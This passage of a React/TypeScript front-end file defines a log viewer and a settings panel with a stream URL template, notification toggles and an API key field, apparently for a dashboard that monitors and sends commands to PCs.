  );
}

function Logs({ logs }: { logs: string[] }) {
  const end = useRef<HTMLDivElement>(null);
  useEffect(() => end.current?.scrollIntoView({ block: "nearest" }), [logs]);
  return (
    <div className="h-72 overflow-auto bg-[#0f1114] rounded-md border border-[#25282e] p-3 font-mono text-xs space-y-1">
      {logs.length === 0 && <div className="text-[#5d6574]">No events yet. Connect to a PC or run a command.</div>}
      {logs.map((l, i) => <div key={i} className="text-[#a9b1bd]">{l}</div>)}
      <div ref={end} />
    </div>
  );
}

function SettingsTab({ streamUrl, setStreamUrl }: { streamUrl: string; setStreamUrl: (s: string) => void }) {
  const [s, setS] = useState({ desktop: true, offline: true });
  const [key, setKey] = useState("");
  return (
    <div className="max-w-xl space-y-5">
      <div className="space-y-1.5">
        <div className="font-medium text-[#e8ecf2]">Stream address</div>
        <Input value={streamUrl} onChange={(e) => setStreamUrl(e.target.value)} className="bg-[#0f1114] border-[#25282e]" />
        <div className="text-xs text-[#5d6574]">{"{name}"} is replaced with the selected PC. Must return an image or MJPEG stream.</div>
      </div>
      {([["desktop", "Desktop alerts", "Show a toast for PC and command events"], ["offline", "Offline warnings", "Notify me when a PC goes offline"]] as const).map(([k, label, desc]) => (
        <div key={k} className="flex items-center justify-between">
          <div><div className="text-[#e8ecf2]">{label}</div><div className="text-xs text-[#8a93a3]">{desc}</div></div>
          <Switch checked={s[k]} onCheckedChange={(v) => setS({ ...s, [k]: v })} />
        </div>
      ))}
      <div className="space-y-1.5">
        <div className="font-medium text-[#e8ecf2]">API key</div>
        <Input type="password" value={key} onChange={(e) => setKey(e.target.value)} placeholder="Paste your API key"
          className="bg-[#0f1114] border-[#25282e]" />
        <Button onClick={() => toast.success("Settings saved for this session")} className={accent}>Save changes</Button>
      </div>
    </div>
  );
}